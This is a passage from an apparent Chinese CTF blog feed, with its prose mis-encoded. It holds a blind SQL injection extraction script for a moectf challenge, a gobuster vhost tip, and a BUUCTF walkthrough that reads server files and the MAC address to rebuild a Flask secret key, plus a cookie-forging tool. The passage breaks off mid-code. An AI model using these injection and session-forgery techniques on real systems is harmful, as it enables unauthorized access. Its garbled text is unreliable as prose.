table_name=&#x27;secret_of_kokomi&#x27; and table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;)#&quot;</span><br><span class="hljs-comment">#         &#125;</span><br><span class="hljs-comment">#         r = requests.post(url, data=p)</span><br><span class="hljs-comment">#         r1 = r.text</span><br><span class="hljs-comment">#         if r1.count(&quot;æˆåŠŸ&quot;) == 4:</span><br><span class="hljs-comment">#             print(k,end=&#x27;&#x27;)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">3506</span>):<br>    str1=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> str1:<br>        p = &#123;<br>            <span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;111&quot;</span>,<br>            <span class="hljs-string">&quot;user_agent&quot;</span>: <span class="hljs-string">&quot;111&quot;</span>,<br>            <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">f&quot;null and binary substr((select content from secret_of_kokomi limit 2,1),<span class="hljs-subst">&#123;j&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;k&#125;</span>&#x27;)#&quot;</span><br>        &#125;<br>        r = requests.post(url, data=p)<br>        r1 = r.text<br>        <span class="hljs-keyword">if</span> r1.count(<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>) == <span class="hljs-number">4</span>:<br>            <span class="hljs-built_in">print</span>(k,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</span><br></code></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿä¸ç”¨è·‘å­—ç¬¦ä¸²é•¿åº¦ï¼Œç›´æ¥è®¾ä¸ªå¤§çš„é•¿åº¦ç›´æ¥è·‘å°±è¡Œã€‚ï¼ˆ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºgobusterçš„vhostæ¨¡å¼ä¸‹æ‰«æä¸å‡ºè™šæ‹Ÿä¸»æœºçš„æƒ…å†µ</title>
    <link href="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/"/>
    <url>/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©åœ¨æ‰“Tryhackmeçš„Web Enumerationçš„æˆ¿é—´çš„æ—¶å€™ä½¿ç”¨gobusterè¿›è¡Œè™šæ‹Ÿä¸»æœºæ‰«æçš„æ—¶å€™å‘ç°ä¸€ç›´æ‰«ä¸å‡ºæ¥æ­£ç¡®ç­”æ¡ˆï¼Œä¸€ç›´æŠ¥çš„éƒ½æ˜¯400çŠ¶æ€ç çš„ä¸»æœºã€‚</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/1.png" srcset="/img/loading.gif" lazyload><p>å»ç½‘ä¸Šæ‰¾wpæ˜æ˜å‘½ä»¤å†™çš„ä¸€æ¨¡ä¸€æ ·å´ä¸å‡ºæ­£ç¡®ç­”æ¡ˆï¼Œå‘ç°ä»–ä»¬çš„gobusterç‰ˆæœ¬å’Œæˆ‘ä¸å¤ªä¸€æ ·ï¼Œ3.5ç‰ˆæœ¬çš„gobusterä¼šæœ‰ä¸€ä¸ªappend domainçš„é€‰é¡¹ï¼Œå‘ç°æ˜¯falseçš„ã€‚çŒœæµ‹å¯èƒ½æ˜¯è¿™ä¸ªçš„é—®é¢˜ã€‚</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/2.png" srcset="/img/loading.gif" lazyload><p>æŸ¥äº†ä¸€ä¸‹vhostæ¨¡å¼çš„å¸®åŠ©æ–‡æ¡£ï¼Œå‘ç°æœ‰ä¸€ä¸ªâ€“append-domainçš„flagå¯ä»¥ç”¨ï¼Œåº”è¯¥å°±æ˜¯å…è®¸å‘æµ‹è¯•åŸŸåä¸­æ·»åŠ å­—ç¬¦çš„æ„æ€äº†ï¼ŒåŠ ä¸Šæµ‹è¯•ä¸€ä¸‹ã€‚</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/3.png" srcset="/img/loading.gif" lazyload><p>è¿™ä¸‹ç»ˆäºå‡ºä¸œè¥¿äº†ï¼Œç®—æ˜¯æŠ˜è…¾äº†ä¸€å°æ®µæ—¶é—´QAQã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>flask_sessionä¼ªé€ </title>
    <link href="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<p>â€‹æœ¬ç¯‡æ–‡ç« å°†è®²è§£BUUCTFçš„[CISCN2019 åä¸œå—èµ›åŒº]Web4ï¼Œå…³äºflask_sessionä¼ªé€ ã€‚</p><p>æœ¬äººèƒ½åŠ›æœ‰é™ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¿˜æœ›å„ä½å¤§ä½¬æŒ‡æ­£ã€‚</p><p>æœ€è¿‘æ‰“æ¯”èµ›é‡åˆ°äº†flask_sessionä¼ªé€ ç›¸å…³çš„é¢˜ç›®ï¼Œæ²¡å­¦è¿‡ï¼Œåˆç¢°å·§éšæœºæŒ‘äº†é“BUUCTFçš„é¢˜ç›®æ­£å¥½è€ƒçš„flask_sessionä¼ªé€ ï¼Œçœ‹å®Œå„ä½å¸ˆå‚…çš„WPåï¼Œè¿›è¡Œä¸€æ¬¡è‡ªæˆ‘æ€»ç»“ã€‚</p><p>æ‰“å¼€é¶æœºåçœ‹åˆ°</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/1.png" srcset="/img/loading.gif" lazyload><p>ç‚¹å‡»åè·³è½¬åˆ°äº†ç™¾åº¦ï¼Œ</p><p>çœ‹ä¸€ä¸‹url</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/2.png" srcset="/img/loading.gif" lazyload><p>æ„Ÿè§‰åƒä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ•…è¿›è¡Œå°è¯•è¯»å–å¯†ç </p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/3.png" srcset="/img/loading.gif" lazyload><p>çœŸè¯»åˆ°äº†</p><p>é‚£å°è¯•è¯»ä¸€ä¸‹&#x2F;flag</p><p>å‡ºç°äº†NO HACKå­—æ ·</p><p>é‚£ä¹ˆçœ‹çœ‹èƒ½ä¸èƒ½è¯»å‡ºå½“å‰æ‰§è¡Œçš„ç¨‹åº&#x2F;proc&#x2F;self&#x2F;cmdline</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/4.png" srcset="/img/loading.gif" lazyload><p>å†è¯»ä¸€è¯»ç¨‹åºæºç &#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! </span><br><span class="hljs-string">@app.route(&#x27;</span>/read<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">def read():</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        url = request.args.get(&#x27;</span>url<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        m = re.findall(&#x27;</span>^file.*<span class="hljs-string">&#x27;, url, re.IGNORECASE)</span><br><span class="hljs-string">        n = re.findall(&#x27;</span>flag<span class="hljs-string">&#x27;, url, re.IGNORECASE)</span><br><span class="hljs-string">        if m or n:</span><br><span class="hljs-string">            return &#x27;</span>No Hack<span class="hljs-string">&#x27;</span><br><span class="hljs-string">        res = urllib.urlopen(url)</span><br><span class="hljs-string">        return res.read()</span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print str(ex)</span><br><span class="hljs-string">    return &#x27;</span>no response<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">@app.route(&#x27;</span>/flag<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">def flag():</span><br><span class="hljs-string">    if session and session[&#x27;</span>username<span class="hljs-string">&#x27;] == &#x27;</span>fuck<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">        return open(&#x27;</span>/flag.txt<span class="hljs-string">&#x27;).read()</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        return &#x27;</span>Access denied<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__==&#x27;</span>__main__<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">    app.run(</span><br><span class="hljs-string">        debug=True,</span><br><span class="hljs-string">        host=&quot;0.0.0.0&quot;</span><br><span class="hljs-string">    )</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>&#x2F;readä¸è®©è¯»flag,ä»&#x2F;flagä¸­è¯»çš„è¯éœ€è¦ä¼ªé€ session</p><p>å…³æ³¨åˆ°ä¸‹é¢è¿™å—ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>random.seed()ç”¨æ¥è®¾ç½®éšæœºç§å­ï¼Œç›¸åŒçš„ç§å­å°±ä¼šä¾ç…§é¡ºåºæ¥éšæœºæ•°å­—ã€‚</p><p>uuid.getnode()æ˜¯ç”¨æ¥è·å–è®¾å¤‡åœ°å€çš„,å› æ­¤æˆ‘ä»¬éœ€è¦å…ˆè¯»å–è®¾å¤‡ç½‘å¡çš„MACåœ°å€å†åœ¨æœ¬åœ°è¿›è¡Œsessionä¼ªé€ ã€‚</p><p>ç™¾åº¦äº†ä¸€ä¸‹linuxä¸‹è®¾å¤‡ç½‘å¡åœ°å€åœ¨&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressä¸‹</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/5.png" srcset="/img/loading.gif" lazyload><p>è¯»åˆ°åå°†å…¶åœ¨pythonä¸­è®¾ç½®ä¸ºrandom.seed(),å¹¶randomè·‘ä¸€ä¸‹å¾—åˆ°SECRET_KEY</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/6.png" srcset="/img/loading.gif" lazyload><p>æ³¨æ„è¿™é‡Œæœ‰ä¸ªå‘ï¼Œç›®æ ‡åœ°å€è®¾å¤‡æ˜¯ç”¨python2è·‘çš„ï¼Œè€Œæˆ‘è¿™é‡Œæ˜¯python3,ä¹‹å‰æˆ‘ä¸€ç›´ç”¨è¿™ä¸ªå½“SECRET_KEY,ç„¶åä¸€ç›´è·‘ä¸å‡ºflagï¼Œç™¾åº¦äº†ä¸€ä¸‹ï¼Œpython2å’Œpython3 randomå‡ºæ¥çš„ä½æ•°æ˜¯ä¸ä¸€æ ·çš„ã€‚ï¼ˆè¢«å‘äº†è€é•¿æ—¶é—´äº†5555555ï¼‰æˆ‘è¿™é‡Œæ²¡è£…python2ï¼Œå°±æ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™è·‘ä¸€ä¸‹ã€‚</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/7.png" srcset="/img/loading.gif" lazyload><p>ä¸è¿‡ç›´æ¥python3å–9ä½å¥½åƒä¹Ÿè¡Œã€‚</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/8.png" srcset="/img/loading.gif" lazyload><p>æŠŠè‡ªå·±çš„cookieè§£å¯†ä¸€ä¸‹çœ‹çœ‹æ ¼å¼ã€‚</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/9.png" srcset="/img/loading.gif" lazyload><p>ä¸‹é¢é™„ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br>__author__ = <span class="hljs-string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><br><span class="hljs-comment"># standard imports</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-comment"># Abstract Base Classes (PEP 3119)</span><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">3</span>: <span class="hljs-comment"># &lt; 3.0</span><br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Must be using at least Python 3&#x27;</span>)<br><span class="hljs-keyword">elif</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABC, abstractmethod<br><br><span class="hljs-comment"># Lib for argument parsing</span><br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-comment"># external Imports</span><br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key<br><br><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(metaclass=ABCMeta):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(<span class="hljs-title class_ inherited__">ABC</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Args are only relevant for __main__ usage</span><br>    <br>    <span class="hljs-comment">## Description for help</span><br>    parser = argparse.ArgumentParser(<br>                description=<span class="hljs-string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,<br>                epilog=<span class="hljs-string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)<br><br>    <span class="hljs-comment">## prepare sub commands</span><br>    subparsers = parser.add_subparsers(<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;sub-command help&#x27;</span>, dest=<span class="hljs-string">&#x27;subcommand&#x27;</span>)<br><br>    <span class="hljs-comment">## create the parser for the encode command</span><br>    parser_encode = subparsers.add_parser(<span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;encode&#x27;</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie structure&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## create the parser for the decode command</span><br>    parser_decode = subparsers.add_parser(<span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;decode&#x27;</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">False</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie value&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## get args</span><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment">## find the option chosen</span><br>    <span class="hljs-keyword">if</span>(args.subcommand == <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_structure <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))<br>    <span class="hljs-keyword">elif</span>(args.subcommand == <span class="hljs-string">&#x27;decode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))<br>        <span class="hljs-keyword">elif</span>(args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span 